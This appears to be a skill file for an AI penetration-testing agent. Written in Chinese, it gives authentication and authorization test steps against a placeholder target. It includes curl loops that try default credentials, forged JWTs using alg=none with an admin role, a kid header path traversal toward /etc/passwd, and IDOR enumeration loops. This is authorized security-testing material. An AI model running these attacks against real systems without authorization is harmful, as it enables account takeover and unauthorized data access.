---
name: auth_test
description: "认证与授权测试。Use when: 目标有登录/注册/密码重置功能 — 测试认证绕过、会话管理、JWT攻击、OAuth缺陷、IDOR/越权"
allowed-tools:
  - execute
  - http_request
  - browser
  - create_candidate_finding
  - confirm_finding
  - reject_finding
  - request_approval
phase: scan
disable_model_invocation: false
---

# 认证与授权测试

## Part A: 默认凭据

```bash
for cred in "admin:admin" "admin:password" "admin:admin123" "root:root" \
            "guest:guest" "user:user" "test:test"; do
  user="${cred%:*}"
  pass="${cred#*:}"
  curl -sk -X POST "https://TARGET/login" -d "username=$user&password=$pass" -o /dev/null -w "%{http_code} $cred\n"
done
```

如果任一凭据登录成功 → `create_candidate_finding(severity="high", title="默认凭据可登录")`

## Part B: 会话 Cookie 安全

```bash
curl -skI "https://TARGET/" | grep -i "set-cookie"
```

- 缺少 `HttpOnly` → `create_candidate_finding(severity="low")`
- 缺少 `Secure` → `create_candidate_finding(severity="medium")`
- 缺少 `SameSite` → `create_candidate_finding(severity="low")`
- 登录前后 Session ID 未变化 → `create_candidate_finding(severity="medium", title="会话固定漏洞")`

## Part C: JWT 攻击

```bash
# alg=none 攻击
curl -sk "https://TARGET/api/me" -H "Authorization: Bearer $(python3 -c "
import base64,json
h=base64.urlsafe_b64encode(json.dumps({'alg':'none'}).encode()).rstrip(b'=').decode()
p=base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
print(f'{h}.{p}.')
")"

# kid 注入
curl -sk "https://TARGET/api/me" -H "Authorization: Bearer $(python3 -c "
import base64,json
h=base64.urlsafe_b64encode(json.dumps({'alg':'HS256','kid':'../../../../etc/passwd'}).encode()).rstrip(b'=').decode()
print(f'{h}.eyJzdWIiOiJhZG1pbiJ9.')
")"
```

## Part D: 越权测试 (IDOR/BAC)

```
# 水平越权 — user_A 的 Cookie 访问 user_B 的资源
http_request(method="GET", url="https://TARGET/api/users/456", auth_name="user_A")
→ 如果 200 返回 user_B 数据 = IDOR

# 垂直越权 — 低权限 viewer 访问 admin 端点
http_request(method="GET", url="/admin/users", auth_name="viewer")
http_request(method="POST", url="/api/admin/settings", auth_name="viewer")
→ 如果 200 = 垂直越权

# 批量遍历
for id in $(seq 1 100); do
  curl -sk -H "Cookie: $SESSION" "https://TARGET/api/users/$id" -o /dev/null -w "$id: %{http_code}\n"
done
```
